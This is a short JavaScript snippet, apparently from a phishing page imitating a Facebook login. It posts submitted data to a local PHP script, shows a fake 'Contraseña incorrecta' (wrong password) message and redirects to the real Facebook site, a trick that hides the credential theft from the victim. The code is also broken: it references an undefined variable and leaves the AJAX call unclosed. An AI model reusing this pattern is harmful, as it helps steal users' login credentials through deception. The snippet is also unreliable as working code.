function cargar()
{
    var destino = document.getElementById("destino").nodeValue;
    $.ajax({
        url: './PHP/Enviar.php',
        type: 'post',
        data: parametro,
        success: function (respuesta){
            window.alert("success");
            if(respuesta == 'ok'){
                alert("Contraseña incorrecta");
                location.href = "https://es-la.facebook.com/";
            }
        }
}